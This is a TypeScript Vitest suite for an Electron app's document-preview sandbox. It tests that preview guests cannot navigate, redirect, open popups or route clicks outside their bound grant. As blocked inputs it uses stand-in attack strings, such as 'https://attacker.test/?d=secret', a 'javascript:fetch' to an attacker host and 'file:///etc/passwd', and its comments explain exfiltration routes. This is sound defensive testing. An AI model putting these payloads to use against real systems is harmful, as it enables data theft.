import { beforeEach, describe, expect, it, vi } from 'vitest'
import {
  getWorkspaceDocPageGuest,
  installDocPreviewGuestPolicy,
  readDocPreviewGuestBoundGrantId,
  reportDocPreviewLinkClick
} from './doc-preview-guest-policy'
import { buildDocPreviewUrl } from '../../shared/doc-preview-scheme'
import {
  mintDocPreviewGrant,
  revokeAllDocPreviewGrants,
  revokeDocPreviewGrant
} from './doc-preview-grant-registry'

type GuestHandlers = Record<string, (...args: never[]) => void>

const HOST_RENDERER_ID = 42

function installOnFakeGuest(
  hostId: number = HOST_RENDERER_ID,
  /** What the guest is already showing when the embedder hands it over, as a real one usually is. */
  initialUrl = ''
): {
  contents: object
  handlers: GuestHandlers
  hostId: number
  isFocused: ReturnType<typeof vi.fn>
  send: ReturnType<typeof vi.fn>
  setWebRTCIPHandlingPolicy: ReturnType<typeof vi.fn>
  windowOpenHandler: (details: { url: string }) => { action: string }
  /** Why without the `destroyed` event: Chromium tears the contents down before main runs it. */
  markContentsDestroyed: () => void
} {
  const handlers: GuestHandlers = {}
  let contentsDestroyed = false
  const send = vi.fn()
  const isFocused = vi.fn(() => true)
  const setWebRTCIPHandlingPolicy = vi.fn()
  let windowOpenHandler: (details: { url: string }) => { action: string } = () => ({
    action: 'deny'
  })
  const register = (event: string, handler: (...args: never[]) => void): void => {
    handlers[event] = handler
  }
  const guest = {
    isFocused,
    isDestroyed: () => contentsDestroyed,
    getURL: () => initialUrl,
    on: vi.fn(register),
    once: vi.fn(register),
    setWindowOpenHandler: vi.fn((handler: (details: { url: string }) => { action: string }) => {
      windowOpenHandler = handler
    }),
    setWebRTCIPHandlingPolicy
  }
  installDocPreviewGuestPolicy(guest as never, { id: hostId, send })
  return {
    contents: guest,
    handlers,
    hostId,
    isFocused,
    send,
    setWebRTCIPHandlingPolicy,
    windowOpenHandler: (details) => windowOpenHandler(details),
    markContentsDestroyed: () => {
      contentsDestroyed = true
    }
  }
}

type FakeGuest = ReturnType<typeof installOnFakeGuest>

function startMainFrameNavigation(guest: FakeGuest, url: string): void {
  guest.handlers['did-start-navigation']?.({ url, isMainFrame: true } as never)
}

/** A guest already showing a document, which is the only state a link can be pressed in. */
function boundGuest(): { grant: ReturnType<typeof mintGrant>; guest: FakeGuest } {
  const grant = mintGrant()
  const guest = installOnFakeGuest()
  startMainFrameNavigation(guest, buildDocPreviewUrl(grant.id, 'index.html'))
  return { grant, guest }
}

function reportClick(guest: FakeGuest, url: string): void {
  reportDocPreviewLinkClick(guest.contents as never, url)
}

// Why a fresh page per grant: the registry is keyed by the page now, so two grants sharing one
// would have the second silently replace the first rather than stand beside it.
let nextDocPageOrdinal = 0

function mintGrant(): ReturnType<typeof mintDocPreviewGrant> {
  nextDocPageOrdinal += 1
  return mintDocPreviewGrant({
    owner: { kind: 'ssh', connectionId: 'ssh-1' },
    root: '/home/alice/docs',
    entryRelativePath: 'index.html',
    browserPageId: `doc-page-${nextDocPageOrdinal}`
  })
}

beforeEach(() => {
  vi.clearAllMocks()
  revokeAllDocPreviewGrants()
})

describe('doc preview guest policy', () => {
  it('allows relative navigation within the bound grant', () => {
    const { grant, guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.(
      { preventDefault } as never,
      buildDocPreviewUrl(grant.id, 'guide.html') as never
    )

    expect(preventDefault).not.toHaveBeenCalled()
    expect(guest.send).not.toHaveBeenCalled()
  })

  // Why an unlatched guest is refused rather than trusted: the renderer-set src is
  // browser-initiated and never reaches will-navigate, so a navigation arriving before the latch is
  // one the guest started for itself.
  it('blocks a navigation the guest starts before a document has bound it', () => {
    const grant = mintGrant()
    const guest = installOnFakeGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.(
      { preventDefault } as never,
      buildDocPreviewUrl(grant.id, 'index.html') as never
    )

    expect(preventDefault).toHaveBeenCalledOnce()
    expect(guest.send).not.toHaveBeenCalled()
  })

  it('blocks navigation into a different live grant once bound', () => {
    const { guest } = boundGuest()
    const otherGrant = mintGrant()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.(
      { preventDefault } as never,
      buildDocPreviewUrl(otherGrant.id, 'index.html') as never
    )

    expect(preventDefault).toHaveBeenCalledOnce()
  })

  it('blocks a revoked grant even when it matches the bound id', () => {
    const { grant, guest } = boundGuest()
    revokeAllDocPreviewGrants()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.(
      { preventDefault } as never,
      buildDocPreviewUrl(grant.id, 'guide.html') as never
    )

    expect(preventDefault).toHaveBeenCalledOnce()
  })

  it('blocks an external navigation without offering it to the renderer', () => {
    const { guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.({ preventDefault } as never, 'https://example.com/' as never)

    expect(preventDefault).toHaveBeenCalledOnce()
    expect(guest.send).not.toHaveBeenCalled()
  })

  it('blocks a file: navigation', () => {
    const { guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.({ preventDefault } as never, 'file:///etc/passwd' as never)

    expect(preventDefault).toHaveBeenCalledOnce()
    expect(guest.send).not.toHaveBeenCalled()
  })

  it('applies the same rule to redirects', () => {
    const { guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-redirect']?.({ preventDefault } as never, 'https://evil.test/' as never)

    expect(preventDefault).toHaveBeenCalledOnce()
    expect(guest.send).not.toHaveBeenCalled()
  })

  it('denies every popup and routes none of them', () => {
    const { guest } = boundGuest()

    expect(guest.windowOpenHandler({ url: 'https://example.com/docs' })).toEqual({
      action: 'deny'
    })
    expect(guest.windowOpenHandler({ url: 'file:///etc/passwd' })).toEqual({ action: 'deny' })
    expect(guest.send).not.toHaveBeenCalled()
  })

  // Why: will-navigate never fires for a subframe, so an <iframe src="https://…"> would load
  // off-machine even though the top frame cannot.
  it('blocks a subframe navigating outside the grant, without opening a tab for it', () => {
    const { guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-frame-navigate']?.({
      preventDefault,
      url: 'https://tracker.test/pixel',
      isMainFrame: false
    } as never)

    expect(preventDefault).toHaveBeenCalledOnce()
    expect(guest.send).not.toHaveBeenCalled()
  })

  it('lets a subframe load an in-grant asset', () => {
    const { grant, guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-frame-navigate']?.({
      preventDefault,
      url: buildDocPreviewUrl(grant.id, 'chart.html'),
      isMainFrame: false
    } as never)

    expect(preventDefault).not.toHaveBeenCalled()
  })

  // Why this group exists: the external-link route ends in a real browser tab with full network, so
  // a document that can read its grant and reach that route can exfiltrate it. Only a reader's own
  // press on a link may, and only the guest's preload can tell that a press was one.
  describe('the trusted-click route out of the preview', () => {
    // The headline. The earlier design read a recent-input timestamp, so a script that navigated
    // shortly after any genuine press was routed out as if the press had asked for it. Here the
    // navigation sinks route nothing at all, so when the input happened cannot matter.
    it('routes nothing for a scripted location change or window.open, whenever input happened', () => {
      const { guest } = boundGuest()
      const preventDefault = vi.fn()

      // Genuine input the guest would report, delivered immediately before the document acts.
      guest.handlers['input-event']?.({} as never, { type: 'mouseDown' } as never)
      guest.handlers['before-input-event']?.({} as never, { type: 'keyDown' } as never)
      guest.handlers['will-navigate']?.(
        { preventDefault } as never,
        'https://attacker.test/?d=secret' as never
      )
      const popup = guest.windowOpenHandler({ url: 'https://attacker.test/?d=secret' })

      expect(preventDefault).toHaveBeenCalledOnce()
      expect(popup).toEqual({ action: 'deny' })
      expect(guest.send).not.toHaveBeenCalled()
      // Why assert the absence of the listeners too: with them gone there is no timing a document
      // could hit, rather than a window it merely failed to hit in this test.
      expect(guest.handlers['input-event']).toBeUndefined()
      expect(guest.handlers['before-input-event']).toBeUndefined()
    })

    it('routes a reported click on an external link exactly once', () => {
      const { guest } = boundGuest()

      reportClick(guest, 'https://example.com/docs')

      expect(guest.send).toHaveBeenCalledExactlyOnceWith('docPreview:externalLink', {
        url: 'https://example.com/docs'
      })
    })

    it('drops a click reported while the guest is not the contents the reader is looking at', () => {
      const { guest } = boundGuest()
      guest.isFocused.mockReturnValue(false)

      reportClick(guest, 'https://example.com/docs')

      expect(guest.send).not.toHaveBeenCalled()
    })

    it('drops a click reported by a sender that is not a preview guest', () => {
      const { guest } = boundGuest()

      reportDocPreviewLinkClick({ isFocused: () => true } as never, 'https://example.com/docs')

      expect(guest.send).not.toHaveBeenCalled()
    })

    it('drops a click reported by a guest that never bound a grant', () => {
      mintGrant()
      const guest = installOnFakeGuest()

      reportClick(guest, 'https://example.com/docs')

      expect(guest.send).not.toHaveBeenCalled()
    })

    it("drops a click once the guest's bound grant is revoked", () => {
      const { guest } = boundGuest()
      revokeAllDocPreviewGrants()

      reportClick(guest, 'https://example.com/docs')

      expect(guest.send).not.toHaveBeenCalled()
    })

    it.each([
      'file:///etc/passwd',
      'javascript:fetch("https://attacker.test")',
      'orca-preview://a/b',
      '/Users/alice/secrets.txt',
      ''
    ])('drops a reported click on %s, which is not the web', (url) => {
      const { guest } = boundGuest()

      reportClick(guest, url)

      expect(guest.send).not.toHaveBeenCalled()
    })

    it('stops routing for a guest that has been destroyed', () => {
      const { guest } = boundGuest()

      guest.handlers['destroyed']?.()
      reportClick(guest, 'https://example.com/docs')

      expect(guest.send).not.toHaveBeenCalled()
    })
  })

  // Why: a peer connection is UDP straight off the network stack — the response CSP and the
  // session's request filter both miss it, so this is the only place it can be refused.
  it('denies the guest non-proxied WebRTC UDP at attach', () => {
    const guest = installOnFakeGuest()

    expect(guest.setWebRTCIPHandlingPolicy).toHaveBeenCalledWith('disable_non_proxied_udp')
  })

  // Why: latching from a subframe would let an in-document iframe decide which grant the guest
  // belongs to, and every later main-frame check would be measured against that.
  it('binds the guest from the main frame only', () => {
    const grant = mintGrant()
    const otherGrant = mintGrant()
    const guest = installOnFakeGuest()

    guest.handlers['did-start-navigation']?.({
      url: buildDocPreviewUrl(otherGrant.id, 'index.html'),
      isMainFrame: false
    } as never)
    startMainFrameNavigation(guest, buildDocPreviewUrl(grant.id, 'index.html'))
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.(
      { preventDefault } as never,
      buildDocPreviewUrl(otherGrant.id, 'index.html') as never
    )

    expect(preventDefault).toHaveBeenCalledOnce()
  })

  describe('tool authorization', () => {
    it('answers the hosting renderer for a guest bound to a live grant', () => {
      const { grant, guest } = boundGuest()

      expect(getWorkspaceDocPageGuest(grant.browserPageId, HOST_RENDERER_ID)).toBe(guest.contents)
    })

    it('refuses a renderer that does not host the preview', () => {
      const { grant } = boundGuest()

      expect(getWorkspaceDocPageGuest(grant.browserPageId, HOST_RENDERER_ID + 1)).toBeNull()
    })

    // Why this is the ordinary case and not an edge one: the embedder hands the guest over after
    // it has already started loading its src, so the navigation that binds most previews to their
    // grant happens before any listener here exists. Missing it leaves the tools unable to name
    // the guest for as long as the reader stays on the page they opened.
    it('binds a guest that is already showing its document when the policy installs', () => {
      const grant = mintGrant()
      const guest = installOnFakeGuest(HOST_RENDERER_ID, buildDocPreviewUrl(grant.id, 'index.html'))

      expect(getWorkspaceDocPageGuest(grant.browserPageId, HOST_RENDERER_ID)).toBe(guest.contents)
    })

    // The same miss, one event later: the load started before the listener and commits after it.
    it('binds a guest whose first navigation only reaches the commit', () => {
      const grant = mintGrant()
      const guest = installOnFakeGuest()

      guest.handlers['did-navigate']?.(
        {} as never,
        buildDocPreviewUrl(grant.id, 'index.html') as never
      )

      expect(getWorkspaceDocPageGuest(grant.browserPageId, HOST_RENDERER_ID)).toBe(guest.contents)
    })

    // Why: the src commit is what proves this guest is showing that grant. Before it, the id names
    // a document nothing has been asked to render.
    it('refuses a guest that has not committed a document yet', () => {
      const grant = mintGrant()
      installOnFakeGuest()

      expect(getWorkspaceDocPageGuest(grant.browserPageId, HOST_RENDERER_ID)).toBeNull()
    })

    // Why: revoking is how a closed tab withdraws its preview, and it happens while the guest is
    // still being torn down — a tool must stop answering at revoke, not at destroy.
    it('stops answering once the grant is revoked', () => {
      const { grant } = boundGuest()

      revokeDocPreviewGrant(grant.id)

      expect(getWorkspaceDocPageGuest(grant.browserPageId, HOST_RENDERER_ID)).toBeNull()
    })

    it('drops the guest when it is destroyed', () => {
      const { grant, guest } = boundGuest()

      guest.handlers['destroyed']?.()

      expect(getWorkspaceDocPageGuest(grant.browserPageId, HOST_RENDERER_ID)).toBeNull()
    })

    // Why this is separate from the destroy event: the contents die before main runs that listener,
    // so in that window the registration still looks live and only this check refuses it.
    it('refuses a guest whose contents died before the destroy event arrived', () => {
      const { grant, guest } = boundGuest()

      guest.markContentsDestroyed()

      expect(getWorkspaceDocPageGuest(grant.browserPageId, HOST_RENDERER_ID)).toBeNull()
    })

    it('answers nothing for a grant no preview ever rendered', () => {
      const grant = mintGrant()

      expect(getWorkspaceDocPageGuest(grant.browserPageId, HOST_RENDERER_ID)).toBeNull()
    })

    // Why this is what makes three latch call sites safe: install, did-start-navigation and
    // did-navigate all feed the same latch, so without the no-rebind guard the second and third
    // would let a later navigation move a bound guest onto another grant — and a tool asking for
    // that grant would be handed a guest showing someone else's document.
    it('never rebinds a bound guest onto a second grant', () => {
      const { grant, guest } = boundGuest()
      const other = mintGrant()

      startMainFrameNavigation(guest, buildDocPreviewUrl(other.id, 'index.html'))
      guest.handlers['did-navigate']?.(
        {} as never,
        buildDocPreviewUrl(other.id, 'index.html') as never
      )

      expect(getWorkspaceDocPageGuest(other.browserPageId, HOST_RENDERER_ID)).toBeNull()
      expect(getWorkspaceDocPageGuest(grant.browserPageId, HOST_RENDERER_ID)).toBe(guest.contents)
    })

    // Why the replacement is registered before the old guest's teardown runs: a re-mint attaches
    // the new guest first, and Chromium runs the outgoing guest's destroyed listener afterwards. A
    // teardown that deleted by page alone would unregister the guest the reader is now looking at.
    it('leaves a re-minted preview registered when the guest it replaced tears down', () => {
      const first = mintGrant()
      const outgoing = installOnFakeGuest(
        HOST_RENDERER_ID,
        buildDocPreviewUrl(first.id, 'index.html')
      )
      const remint = mintDocPreviewGrant({
        owner: { kind: 'ssh', connectionId: 'ssh-1' },
        root: '/home/alice/docs',
        entryRelativePath: 'index.html',
        browserPageId: first.browserPageId
      })
      const incoming = installOnFakeGuest(
        HOST_RENDERER_ID,
        buildDocPreviewUrl(remint.id, 'index.html')
      )
      expect(getWorkspaceDocPageGuest(first.browserPageId, HOST_RENDERER_ID)).toBe(
        incoming.contents
      )

      outgoing.handlers['destroyed']?.()

      expect(getWorkspaceDocPageGuest(first.browserPageId, HOST_RENDERER_ID)).toBe(
        incoming.contents
      )
    })

    // Why the grant has to be live at the latch and not only at each later request: registering the
    // page a dead grant names would put a guest that can read nothing into the registry the tool
    // door answers from, under a page a live grant may later want.
    it('registers nothing for a guest showing a grant that is already revoked', () => {
      const grant = mintGrant()
      revokeDocPreviewGrant(grant.id)

      const guest = installOnFakeGuest(HOST_RENDERER_ID, buildDocPreviewUrl(grant.id, 'index.html'))

      expect(getWorkspaceDocPageGuest(grant.browserPageId, HOST_RENDERER_ID)).toBeNull()
      // The presence half: the same install does register when the grant is still live.
      const live = mintGrant()
      installOnFakeGuest(HOST_RENDERER_ID, buildDocPreviewUrl(live.id, 'index.html'))
      expect(getWorkspaceDocPageGuest(live.browserPageId, HOST_RENDERER_ID)).not.toBeNull()
      expect(guest.contents).toBeDefined()
    })

    // Why both directions: two previews open at once must not be able to drive each other's guest.
    it('keeps two live previews on their own guests', () => {
      const first = boundGuest()
      const second = boundGuest()

      expect(getWorkspaceDocPageGuest(first.grant.browserPageId, HOST_RENDERER_ID)).toBe(
        first.guest.contents
      )
      expect(getWorkspaceDocPageGuest(second.grant.browserPageId, HOST_RENDERER_ID)).toBe(
        second.guest.contents
      )
    })
  })

  // Session events name the contents and nothing else, so this is how a fence firing on the whole
  // partition works out which preview — if any — the reader should be told about.
  describe('naming the grant a contents is showing', () => {
    it('answers the bound grant for a live preview guest', () => {
      const { grant, guest } = boundGuest()

      expect(readDocPreviewGuestBoundGrantId(guest.contents as never)).toBe(grant.id)
    })

    it('answers nothing for a contents that is not a preview guest', () => {
      boundGuest()

      expect(readDocPreviewGuestBoundGrantId({} as never)).toBeNull()
    })

    it('answers nothing for a preview guest that has committed no document', () => {
      const guest = installOnFakeGuest()

      expect(readDocPreviewGuestBoundGrantId(guest.contents as never)).toBeNull()
    })

    it('answers nothing once the guest is gone', () => {
      const { guest } = boundGuest()

      guest.handlers['destroyed']?.()

      expect(readDocPreviewGuestBoundGrantId(guest.contents as never)).toBeNull()
    })
  })
})
